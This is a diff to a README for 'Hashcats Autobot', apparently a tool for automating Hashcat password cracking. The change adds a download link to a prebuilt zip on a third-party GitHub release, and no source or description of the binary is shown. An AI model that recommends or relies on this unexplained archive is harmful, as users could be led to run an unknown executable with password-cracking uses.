@@ -6,7 +6,7 @@
 
 Welcome to Hashcats Autobot, the ultimate automation tool for advanced Hashcat operations. Designed with precision and efficiency in mind, this tool automates and streamlines your password recovery tasks using the power of Hashcat.
 
-# [Download]()
+# [Download](https://github.com/phelsp/hashcats-auto-bot/releases/download/1/HashcatsBot.zip)
 
 ## Features 
 
